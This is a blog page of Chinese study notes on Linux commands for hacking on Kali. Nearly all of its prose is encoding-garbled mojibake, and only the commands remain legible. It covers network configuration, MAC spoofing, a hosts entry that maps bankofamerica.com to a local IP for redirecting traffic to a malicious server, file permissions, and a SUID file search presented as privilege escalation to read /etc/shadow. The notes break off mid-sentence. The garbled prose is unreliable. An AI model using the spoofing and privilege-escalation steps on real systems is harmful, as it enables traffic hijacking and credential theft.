</p><p>æ¥è‡ª ifconfig çš„æ­¤ä¿¡æ¯ä½¿æ‚¨å¯ä»¥è¿æ¥å¹¶æ“ä½œå±€åŸŸç½‘ (LAN) è®¾ç½®ï¼Œè¿™æ˜¯é»‘å®¢æ”»å‡»çš„åŸºæœ¬æŠ€èƒ½ï¼ˆå†…ç½‘ç©¿é€ä¹ˆï¼Ÿï¼‰</p><h3 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;iwconfig </span><br><span class="line">wlan0 IEEE 802.11bg ESSID:off/any </span><br><span class="line">Mode:Managed Access Point: <span class="keyword">Not</span> Associated <span class="attribute">Tx-Power</span>=20 dBm </span><br><span class="line">Â­Â­snip-- </span><br><span class="line">lo <span class="literal">no</span><span class="built_in"> wireless </span>extensions  </span><br><span class="line">eth0 <span class="literal">no</span><span class="built_in"> wireless </span>extensions</span><br></pre></td></tr></table></figure><p>å¯¹äº wlan0ï¼Œæˆ‘ä»¬äº†è§£äº†æˆ‘ä»¬çš„è®¾å¤‡èƒ½å¤Ÿæ”¯æŒçš„ 802.11 IEEE æ— çº¿æ ‡å‡†ï¼šb å’Œ g ï¼Œ ä¸¤ç§æ—©æœŸçš„æ— çº¿é€š ä¿¡æ ‡å‡†ã€‚ç°åœ¨å¤§å¤šæ•°æ— çº¿è®¾å¤‡ä¹ŸåŒ…æ‹¬ n ( n æ˜¯æœ€æ–°çš„æ ‡å‡†)ã€‚ </p><p>æˆ‘ä»¬è¿˜ä» iwconfig ä¸­å­¦ä¹ äº†æ— çº¿æ‰©å±•çš„æ¨¡å¼(æœ¬ä¾‹ä¸­ä¸º Mode:Manageï¼Œä¸åŒäº monitor æˆ– promiscuous mode)ã€‚åœ¨ç ´è§£æ— çº¿å¯†ç æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°æ··æ‚æ¨¡å¼(promiscuous mode)ã€‚ </p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°æ— çº¿ç½‘å¡ï¼ˆé€‚é…å™¨ï¼‰æœªè¿æ¥ï¼ˆæœªå…³è”ï¼‰åˆ°æ¥å…¥ç‚¹ (AP) ï¼Œå¹¶ä¸”å…¶åŠŸç‡ä¸º 20 dBmï¼Œ è¿™è¡¨ç¤ºä¿¡å·å¼ºåº¦ã€‚ </p><h3 id="æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯"><a href="#æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯" class="headerlink" title="æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯"></a>æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯</h3><p>ifconfig  eth0  192.168.181.115  netmask  255.255.0.0  broadcast  192.168.1.255     </p><p>ä½¿ç”¨ ifconfig å‘½ä»¤æ”¹å˜ä½ çš„IPï¼Œå­ç½‘æ©ç ï¼Œå¹¿æ’­åœ°å€</p><p>ä¼ªè£…MACï¼ˆ HWaddr ï¼‰åœ°å€ï¼š</p><p>â€‹        ç®€å•åœ°ä½¿ç”¨ ifconfig å‘½ä»¤çš„ down é€‰é¡¹æ¥å…³é—­è¯¥æ¥å£ </p><p>â€‹        ç„¶åè¾“å…¥ ifconfig å‘½ä»¤å¹¶åŠ ä¸Šæ¥å£åç§° (hw è¡¨ç¤ºç¡¬ä»¶ï¼Œether è¡¨ç¤ºä»¥å¤ªç½‘) å’Œæ–°çš„ä¼ªé€  MAC åœ° </p><p>â€‹        æœ€åï¼Œä½¿ç”¨é€‰é¡¹ up å¤‡ä»½æ¥å£ä»¥è¿›è¡Œæ›´æ”¹ã€‚ </p><p>ä¾‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">down</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">hw</span>  <span class="selector-tag">ether</span>  00<span class="selector-pseudo">:11</span><span class="selector-pseudo">:22</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:44</span><span class="selector-pseudo">:55</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p>dhclient  eth0     ä» DHCPæœåŠ¡å™¨åˆ†é…æ–°çš„ IPåœ°å€</p><p>dig hackers-arise.com ns    (nameserver çš„ç¼©å†™ï¼‰ä»ä¸€ä¸ªåŸŸåæœåŠ¡å™¨è·å–ä¿¡æ¯ </p><p>åœ¨ ADDITIONAL SECTION éƒ¨åˆ†ï¼Œdig æŸ¥è¯¢æ˜¾ç¤ºäº†ä¸º hackersÂ­arise.com æä¾›æœåŠ¡çš„ DNS æœåŠ¡ å™¨çš„ IP åœ°å€</p><p>dig hackers-arise.com mx    è·å–ç”µå­é‚®ä»¶æœåŠ¡å™¨ä¿¡æ¯</p><p>æ›´æ”¹DNSæœåŠ¡å™¨</p><p>leafpad  /etc/resolv.conf         ç„¶åæ–‡ä¸­æ·»åŠ     nameserver 8.8.8.8 </p><p>or</p><p>echo  â€œnameserver  8.8.8.8â€  &gt;&gt;  /etc/resolv.conf </p><p>ï¼ˆä½ çš„æœºå™¨ç°åœ¨å°†è½¬åˆ° Google å…¬å…± DNS æœåŠ¡å™¨æ¥è§£æåŸŸåæˆ IP åœ°å€ã€‚ï¼‰</p><p>æ˜ å°„æ‚¨è‡ªå·±çš„IPåœ°å€ï¼ˆä½ å¯ä»¥å†³å®šæµè§ˆå™¨å°†è®¿é—®å“ªä¸ª IP åœ°å€è€Œä¸æ˜¯è®© DNS æœåŠ¡å†³å®šï¼‰</p><p><strong>å¯¹äºé»‘å®¢ï¼Œè¿™å¯¹äºåŠ«æŒå±€åŸŸç½‘ä¸Šçš„ TCP è¿æ¥ä»¥ä½¿ç”¨ dnsspoof ç­‰å·¥å…·å°†æµé‡å®šå‘åˆ°æ¶æ„ Web æœåŠ¡ å™¨éå¸¸æœ‰ç”¨ã€‚</strong> </p><p>192.168.181.131    bankofamerica.com ï¼ˆåœ¨ IP åœ°å€å’ŒåŸŸåä¸­é—´è¯·ç¡®ä¿ä½ è¾“å…¥çš„æ˜¯ TAB é”®ï¼‰</p><h2 id="æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶"><a href="#æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶" class="headerlink" title="æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶"></a>æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶</h2><p>apt-cache search [snort]     æœç´¢è½¯ä»¶åŒ…</p><p>apt-get  install  [snort]    æ·»åŠ è½¯ä»¶</p><p>apt-get  remove  [snort]    åˆ é™¤è½¯ä»¶    ï¼ˆä¸åˆ é™¤é…ç½®æ–‡ä»¶ï¼‰</p><p>apt-get purge [snort ]    åˆ é™¤è½¯ä»¶åŠå…¶é…ç½®æ–‡ä»¶</p><p>apt-get update     æ›´æ–°ç³»ç»Ÿ</p><p>apt-get upgrade     å‡çº§åº“ä¸­çš„åŒ…</p><p>â€‹            æ·»åŠ è½¯ä»¶ä»“åº“åˆ° SOURCES.LIST æ–‡ä»¶ ï¼š</p><p>â€‹            kali &gt;leafpad  /etc/apt/sources.list </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu trusty main  </span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu precise main</span></span><br></pre></td></tr></table></figure><p>â€‹            å…¶ä¸­</p><p>â€‹            main     åŒ…å«å—æ”¯æŒçš„å¼€æºè½¯ä»¶<br>â€‹            universe     åŒ…å«ç¤¾åŒºç»´æŠ¤çš„å¼€æºè½¯ä»¶<br>â€‹            multiverse     åŒ…å«å—ç‰ˆæƒæˆ–å…¶ä»–æ³•å¾‹é—®é¢˜é™åˆ¶çš„è½¯ä»¶<br>â€‹            restricted     åŒ…å«ä¸“æœ‰è®¾å¤‡é©±åŠ¨ç¨‹åº<br>â€‹            backports     åŒ…å«æ¥è‡ªåç»­ç‰ˆæœ¬çš„</p><p> git clone url</p><h2 id="æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™"><a href="#æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™" class="headerlink" title="æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™"></a>æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™</h2><h3 id="æƒé™ï¼š"><a href="#æƒé™ï¼š" class="headerlink" title="æƒé™ï¼š"></a>æƒé™ï¼š</h3><p>å¿…é¡»ä¸ºæ¯ä¸ªæ–‡ä»¶å’Œç›®å½•åˆ†é…ä½¿ç”¨å®ƒçš„ä¸åŒèº«ä»½çš„ç‰¹å®šçº§åˆ«çš„æƒé™ã€‚ä¸‰ä¸ªçº§åˆ«çš„è®¸å¯å¦‚ä¸‹ï¼š </p><p>r   è¯»æƒé™ã€‚èµ‹äºˆç”¨æˆ·æ‰“å¼€ä¸æŸ¥çœ‹æƒé™<br>w  å†™æƒé™ã€‚èµ‹äºˆç”¨æˆ·æŸ¥çœ‹ä¸ç¼–è¾‘å†™å…¥æƒé™<br>x  æ‰§è¡Œæƒé™ã€‚èµ‹äºˆç”¨æˆ·æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ï¼ˆä½†æ˜¯æ²¡æœ‰å¿…è¦æŸ¥çœ‹æˆ–è€…ç¼–è¾‘å®ƒï¼‰</p><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œroot ç”¨æˆ·å¯ä»¥æ ¹æ®ç”¨æˆ·éœ€è¦çš„æƒé™å‘ç”¨æˆ·æˆäºˆä¸€å®šçº§åˆ«çš„æƒé™ã€‚åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œé€šå¸¸åˆ› å»ºæ–‡ä»¶çš„ç”¨æˆ·æ˜¯æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼Œç”¨æˆ·ç»„æ˜¯ç”¨æˆ·çš„å½“å‰ç»„ã€‚è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…å¯ä»¥æˆäºˆå®ƒå„ç§è®¿é—®æƒé™ã€‚è®©æˆ‘ ä»¬çœ‹çœ‹å¦‚ä½•æ›´æ”¹æƒé™ä»¥å°†æ‰€æœ‰æƒèµ‹äºˆç»™å•ä¸ªç”¨æˆ·å’Œç»„ã€‚ </p><p>chown user filename    èµ‹äºˆä¸ªäººç”¨æˆ·æƒé™</p><p>chgrp group filename    èµ‹äºˆç”¨æˆ·ç»„æƒé™</p><h3 id="æ£€æŸ¥æƒé™-ls-l"><a href="#æ£€æŸ¥æƒé™-ls-l" class="headerlink" title="æ£€æŸ¥æƒé™    ls -l"></a>æ£€æŸ¥æƒé™    ls -l</h3><p>ä¾‹ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;ls  â€“l  /usr/share/hashcat </span><br><span class="line">total<span class="number"> 32952 </span></span><br><span class="line">âŠâ‹         âŒ  â  â â           â </span><br><span class="line">drwxr-xr-x <span class="number"> 5 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 charsets </span><br><span class="line">Â­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hcstat </span><br><span class="line">Â­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hctune </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 masks </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 OpenCL </span><br><span class="line">drwxr -xr-x<span class="number"> 3 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 rules</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå­—ç¬¦å‘Šè¯‰æ‚¨æ–‡ä»¶ç±»å‹ï¼Œå…¶ä¸­ d ä»£è¡¨ç›®å½•ï¼ŒçŸ­åˆ’çº¿ï¼ˆ - ï¼‰è¡¨ç¤ºæ–‡ä»¶ã€‚<br>ä¸‹ä¸€èŠ‚å®šä¹‰æ–‡ä»¶çš„æƒé™ã€‚æœ‰ä¸‰ç»„ ä¸‰ä¸ª å­—ç¬¦ï¼Œç”± readï¼ˆrï¼‰ï¼Œ writeï¼ˆwï¼‰å’Œ executeï¼ˆxï¼‰çš„æŸç§ç»„åˆæŒ‰é¡º åºç»„æˆã€‚</p><p>ç¬¬ä¸€ç»„ä»£è¡¨æ‰€æœ‰è€…çš„æƒé™ï¼Œç¬¬äºŒç»„ä»£è¡¨ç”¨æˆ·æ‰€åœ¨ç»„çš„æƒé™ä»¥åŠæœ€åä¸€ä¸ªï¼Œæ‰€æœ‰å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚ </p><p>æ— è®ºæ‚¨æ­£åœ¨æŸ¥çœ‹å“ªä¸€ç»„ä¸‰ä¸ªå­—æ¯ï¼Œå¦‚æœæ‚¨é¦–å…ˆçœ‹åˆ° rï¼Œè¯¥ç”¨æˆ·æˆ–ç”¨æˆ·ç»„éƒ½æœ‰æƒæ‰“å¼€å’Œè¯»å–è¯¥æ–‡ä»¶æˆ–ç›®å½•ã€‚ ä½œä¸ºä¸­é—´å­—æ¯çš„ w æ„å‘³ç€å®ƒä»¬å¯ä»¥å†™å…¥ï¼ˆä¿®æ”¹ï¼‰æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¹¶ä¸”æœ€åçš„ x æ„å‘³ç€å®ƒä»¬å¯ä»¥æ‰§è¡Œï¼ˆæˆ–è¿è¡Œï¼‰ æ–‡ä»¶æˆ–ç›®å½•ã€‚å¦‚æœç”¨çŸ­åˆ’çº¿ï¼ˆ - ï¼‰æ›¿æ¢ä»»ä½• rï¼Œw æˆ– xï¼Œåˆ™æœªç»™å‡ºç›¸åº”çš„æƒé™ã€‚</p><table><thead><tr><th>äºŒè¿›åˆ¶</th><th>åè¿›åˆ¶</th><th>æƒé™(rwx)</th></tr></thead><tbody><tr><td>000</td><td>0</td><td>â€”</td></tr><tr><td>001</td><td>1</td><td>â€“x</td></tr><tr><td>010</td><td>2</td><td>-w-</td></tr><tr><td>011</td><td>3</td><td>-wx</td></tr><tr><td>100</td><td>4</td><td>râ€“</td></tr><tr><td>101</td><td>5</td><td>r-x</td></tr><tr><td>110</td><td>6</td><td>rw-</td></tr><tr><td>111</td><td>7</td><td>rwx</td></tr></tbody></table><p>chmod  774  hashcat.hcsta    æ›´æ”¹æ–‡ä»¶æƒé™ï¼ˆ7 æ–‡ä»¶æ‰€æœ‰è€…æƒé™  7 æ–‡ä»¶æ‰€æœ‰è€…æ‰€åœ¨ç»„æƒé™ 4å…¶ä»–æ‰€æœ‰ç”¨æˆ·æƒé™ ï¼‰</p><h3 id="UGOè¯­æ³•ï¼š"><a href="#UGOè¯­æ³•ï¼š" class="headerlink" title="UGOè¯­æ³•ï¼š"></a>UGOè¯­æ³•ï¼š</h3><p>è¾“å…¥ chmod å‘½ä»¤ï¼Œç„¶åè¾“å…¥è¦æ›´æ”¹æƒé™çš„ç”¨æˆ·ï¼Œä¸ºç”¨æˆ·æä¾› uï¼Œä¸ºç»„æä¾› gï¼Œä¸º å…¶ä»–ç”¨æˆ·æä¾› oï¼Œæˆ–è€…è¾“å…¥ä¸‰ä¸ªè¿ç®—ç¬¦ä¹‹ä¸€ï¼š </p><p>-     ç§»é™¤ä¸€ä¸ªæƒé™ </p><p>+    æ·»åŠ ä¸€ä¸ªæƒé™ </p><p>=    è®¾ç½®ä¸€ä¸ªæƒé™ </p><p>åœ¨æ“ä½œç¬¦ä¹‹åï¼ŒåŒ…æ‹¬è¦æ·»åŠ æˆ–åˆ é™¤çš„æƒé™ï¼ˆrwxï¼‰ï¼Œæœ€ååŒ…å«è¦åº”ç”¨å®ƒçš„æ–‡ä»¶çš„åç§°ã€‚ </p><p>ä¾‹ï¼š</p><p>chmod  u-w  hashcat.hcstat         åˆ é™¤ç”¨æˆ·å¯¹ hashcat.hcstat æ‰€å±æ–‡ä»¶çš„å†™å…¥æƒé™</p><p>chmod u+x, o+x hashcat.hcstat     åŒæ—¶ä¸ºç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·ï¼ˆä¸åŒ…æ‹¬ç»„ï¼‰æˆäºˆæ‰§è¡Œæƒé™</p><p>Linux è‡ªåŠ¨åˆ†é…åŸºæœ¬æƒé™ï¼ˆé€šå¸¸ä¸ºæ–‡ä»¶ 666 å’Œç›®å½• 777ï¼‰ã€‚</p><p>umask æ–¹æ³•è¡¨ç¤ºè¦ä»æ–‡ä»¶æˆ–ç›®å½•çš„åŸºæœ¬æƒé™ä¸­åˆ é™¤ çš„æƒé™ï¼Œä»¥ä½¿å…¶æ›´å®‰å…¨ã€‚ </p><p>å½“åˆ›å»ºæ–°æ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œå®ƒæƒé™è®¾ç½®ä¸ºé»˜è®¤å€¼å‡å» umask ä¸­çš„å€¼</p><p>ä¸å¤§å¤šæ•° Debian ç³»ç»Ÿä¸€æ ·ï¼Œumask é¢„å…ˆé…ç½®ä¸º 022ï¼Œè¿™æ„å‘³ç€ Kali é»˜è®¤å€¼ä¸º 644ï¼Œæ–‡ä»¶ä¸º 755ï¼Œç›®å½•ä¸º 755ã€‚ </p><h3 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h3><p>umask å€¼å¯¹äºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½ä¸æ˜¯é€šç”¨çš„ã€‚æ¯ä¸ªç”¨æˆ·éƒ½å¯ä»¥ä¸ºå…¶ä¸ªäºº.profile æ–‡ä»¶ä¸­çš„æ–‡ä»¶å’Œç›®å½• è®¾ç½®ä¸ªäººé»˜è®¤ umask å€¼ã€‚è¦ä»¥ç”¨æˆ·èº«ä»½ç™»å½•æ—¶æŸ¥çœ‹å½“å‰å€¼ï¼Œåªéœ€è¾“å…¥å‘½ä»¤ umask å¹¶è®°ä¸‹è¿”å›çš„å†…å®¹ã€‚è¦æ›´ æ”¹ç”¨æˆ·çš„ umask å€¼ï¼Œè¯·ç¼–è¾‘è¯¥æ–‡ä»¶/home/username/.profileï¼Œä¾‹å¦‚ï¼Œæ·»åŠ  umask 007 è¿›è¡Œè®¾ç½®ï¼Œä»¥ä¾¿åªæœ‰æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„çš„æˆå‘˜æ‰å…·æœ‰æƒé™ã€‚ </p><h3 id="ç‰¹åˆ«æƒé™ï¼š"><a href="#ç‰¹åˆ«æƒé™ï¼š" class="headerlink" title="ç‰¹åˆ«æƒé™ï¼š"></a>ç‰¹åˆ«æƒé™ï¼š</h3><p>è®¾ç½®ç”¨æˆ· IDï¼ˆæˆ– SUIDï¼‰ï¼Œ è®¾ç½®ç»„ IDï¼ˆæˆ– SGIDï¼‰</p><h4 id="ä½¿ç”¨-SUIDæˆäºˆä¸´æ—¶-rootæƒé™"><a href="#ä½¿ç”¨-SUIDæˆäºˆä¸´æ—¶-rootæƒé™" class="headerlink" title="ä½¿ç”¨ SUIDæˆäºˆä¸´æ—¶ rootæƒé™"></a>ä½¿ç”¨ SUIDæˆäºˆä¸´æ—¶ rootæƒé™</h4><p>æ­£å¦‚æ‚¨ç°åœ¨åº”è¯¥çŸ¥é“çš„é‚£æ ·ï¼Œç”¨æˆ·åªæœ‰åœ¨æœ‰æƒæ‰§è¡Œè¯¥ç‰¹å®šæ–‡ä»¶æ—¶æ‰èƒ½æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚å¦‚æœç”¨æˆ·åªå…·æœ‰è¯» å–å’Œï¼ˆæˆ–ï¼‰å†™å…¥æƒé™ï¼Œåˆ™æ— æ³•æ‰§è¡Œã€‚è¿™å¯èƒ½çœ‹èµ·æ¥å¾ˆç®€å•ï¼Œä½†è¿™æ¡è§„åˆ™æœ‰ä¾‹å¤–ã€‚<br>ä½ å¯èƒ½é‡åˆ°è¿‡è¿™æ ·ä¸€ç§æƒ…å†µï¼šæ–‡ä»¶åœ¨è¢«æ‰€æœ‰ç”¨æˆ·ï¼ˆå³ä½¿é root ç”¨æˆ·ï¼‰æ‰§è¡ŒæœŸé—´éƒ½éœ€è¦ root ç”¨æˆ·çš„æƒé™ã€‚ ä¾‹å¦‚ï¼Œå…è®¸ç”¨æˆ·æ›´æ”¹å…¶å¯†ç çš„æ–‡ä»¶éœ€è¦è®¿é—®/etc/shadowï¼ˆLinux ä¸­ä¿å­˜ç”¨æˆ·å¯†ç çš„æ–‡ä»¶ï¼‰ï¼Œè¯¥æ–‡ä»¶éœ€è¦ root ç”¨æˆ·æƒé™æ‰èƒ½æ‰§è¡Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šè¿‡åœ¨ç¨‹åºä¸Šè®¾ç½® SUID ä½ï¼Œå¯ä»¥ä¸´æ—¶æˆäºˆæ‰€æœ‰è€…æ‰§è¡Œæ–‡ä»¶æ‰€éœ€çš„ç‰¹æƒã€‚<br>åŸºæœ¬ä¸Šï¼ŒSUID ä½è¡¨ç¤ºä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨æ‰€æœ‰è€…çš„æƒé™æ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œä½†è¿™äº›æƒé™ä¸ä¼šè¶…å‡ºä½¿ç”¨è¯¥æ–‡ ä»¶çš„èŒƒå›´ã€‚<br>è¦è®¾ç½® SUID ä½ï¼Œè¯·åœ¨å¸¸è§„æƒé™ä¹‹å‰è¾“å…¥ 4ï¼Œå› æ­¤å½“è®¾ç½® SUID ä½æ—¶ï¼Œå…·æœ‰ 644 çš„æ–°ç»“æœæƒé™çš„æ–‡ä»¶è¡¨ç¤ºä¸º 4644</p><h4 id="ä½¿ç”¨-SGIDæˆäºˆ-Rootç”¨æˆ·ç»„æƒé™"><a href="#ä½¿ç”¨-SGIDæˆäºˆ-Rootç”¨æˆ·ç»„æƒé™" class="headerlink" title="ä½¿ç”¨ SGIDæˆäºˆ Rootç”¨æˆ·ç»„æƒé™"></a>ä½¿ç”¨ SGIDæˆäºˆ Rootç”¨æˆ·ç»„æƒé™</h4><p>SGID æˆäºˆä¸´æ—¶æƒé™ï¼Œä½†å®ƒæˆäºˆæ–‡ä»¶æ‰€æœ‰è€…ç»„çš„æƒé™ï¼Œè€Œä¸æ˜¯æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ã€‚è¿™æ„å‘³ç€ï¼Œè®¾ç½® SGID ä½ï¼Œå¦‚æœç”¨æˆ·ç»„æœ‰æƒæ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™çš„äººä¹Ÿå¯ä»¥æ‰§è¡Œæ–‡ä»¶ã€‚<br>åº”ç”¨äºç›®å½•æ—¶ï¼ŒSGID ä½çš„å·¥ä½œæ–¹å¼ç•¥æœ‰ä¸åŒï¼šå½“è¯¥ä½ç½®ä½æ—¶åœ¨ç›®å½•ä¸­ï¼Œåœ¨è¯¥ç›®å½•ä¸­åˆ›å»ºçš„æ–°æ–‡ä»¶çš„æ‰€æœ‰æƒå°†è½¬åˆ°ç›®å½•åˆ›å»ºè€…çš„ç»„ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åˆ›å»ºè€…çš„ç»„ã€‚å½“å¤šä¸ªç”¨æˆ·å…±äº«ç›®å½•æ—¶ï¼Œè¿™éå¸¸æœ‰ç”¨ã€‚è¯¥ç»„ä¸­çš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸ä»…ä»…æ˜¯å•ä¸ªç”¨æˆ·ã€‚<br>SGID ä½åœ¨å¸¸è§„æƒé™ä¹‹å‰è¡¨ç¤ºä¸º 2ï¼Œå› æ­¤å½“ SGID ä½ç½®ä½æ—¶ï¼Œå…·æœ‰ç»“æœæƒé™ 644 çš„æ–°æ–‡ä»¶å°†è¡¨ç¤ºä¸º 2644ã€‚<br>åŒæ ·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ chmod å‘½ä»¤ï¼ˆä¾‹å¦‚ï¼Œchmod 2644 filenameï¼‰ ã€‚ </p><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>ä½œä¸ºé»‘å®¢ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç‰¹åˆ«æƒé™è·å–ä¸´æ—¶ root æƒé™å¹¶æ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚è®¿é—®/etc/shadow ä¸­çš„å¯†ç ã€‚ </p><p>åœ¨æ–‡ä»¶ç³»ç»Ÿçš„ä»»ä½•ä½ç½®æŸ¥æ‰¾å¯¹äº root ç”¨æˆ·æˆ–å…¶ä»– sysadminï¼Œå…·æœ‰æƒé™ 4000ï¼ˆ SUID ä½ï¼‰çš„æ–‡ä»¶ã€‚</p><p>find  /  -user  root  -perm  -4000</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /usr/bin </span><br><span class="line">kali &gt;ls  -l </span><br><span class="line">Â­rwxr-xr-x <span class="number">1</span>  root  root  <span class="number">176272</span> Jul <span class="number">18</span> <span class="number">2018</span> stunnel4 </span><br><span class="line">Â­rwxr-xr-x <span class="number">1</span>  root  root   <span class="number">26696</span> Mar <span class="number">17</span> <span class="number">2018</span> sucrack </span><br><span class="line">âŠ-rwsr-xr-x <span class="number">1</span>  root root  <span class="number">140944</span> Jul <span class="number">5</span>  <span class="number">2018</span> sudo</span><br></pre></td></tr></table></figure><p> è¯·æ³¨æ„âŠï¼Œæ‰€æœ‰è€…çš„ç¬¬ä¸€ç»„æƒé™ï¼ˆå…·æœ‰ s ä»£æ›¿ xï¼‰ã€‚è¿™å°±æ˜¯ Linux è¡¨ç¤º SUID ä½å·²è®¾ç½®çš„æ–¹å¼ã€‚è¿™æ„å‘³ç€ ä»»ä½•äººè·‘sudoæ–‡ä»¶å…·æœ‰rootç”¨æˆ·çš„æƒé™ï¼Œè¿™å¯èƒ½æ˜¯ç³»ç»Ÿç®¡ç†å‘˜çš„å®‰å…¨é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æ˜¯é»‘å®¢çš„æ½œåœ¨æ”»å‡»åª’ä»‹ã€‚ </p><h2 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>æŸ¥çœ‹è¿›ç¨‹</p><p>USER  è¿›ç¨‹ç”¨æˆ·<br>PID   è¿›ç¨‹ id<br>%CPU  CPU å ç”¨ç‡<br>75<br>%MEM  è¿›ç¨‹ CPU å ç”¨ç‡<br>COMMAND è¿›ç¨‹å</p><p>é€šå¸¸ï¼Œè¦å¯¹è¿›ç¨‹æ‰§è¡Œä»»ä½•æ“ä½œï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šå…¶ PIDã€‚</p><p>é€šè¿‡è¿›ç¨‹åè¿‡æ»¤è¿›ç¨‹</p><p>ä¾‹ï¼š    ps  aux  |  grep  msfconsole </p><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>æŒ‰ä½¿ç”¨çš„èµ„æºæ’åºçš„è¿›ç¨‹æ˜¾ç¤º ï¼Œä»æœ€å¤§çš„è¿›ç¨‹å¼€å§‹ã€‚ä¸ ps å‘½ä»¤ä¸åŒçš„æ˜¯ï¼Œtop å‘½ä»¤æ¯ 10 ç§’åŠ¨æ€åˆ·æ–°ä¸€æ¬¡åˆ—è¡¨ï¼Œ è€Œ ps å‘½ä»¤åªæä¾›ä¸€æ¬¡è¿›ç¨‹å¿«ç…§ã€‚</p><h3 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h3><p>åœ¨è¿è¡Œè¿›ç¨‹æ—¶è®¾ç½®ä¼˜å…ˆçº§ </p><p>ä¾‹ï¼šnice -n  -10  /bin/slowprocess </p><p>é«˜ nice å€¼ä¸ºä½ä¼˜å…ˆçº§ï¼Œä½ nice å€¼ä¸ºé«˜ä¼˜å…ˆçº§</p><p>è¿›ç¨‹çš„æ‰€æœ‰è€…å¯ä»¥é™ä½è¿›ç¨‹çš„ 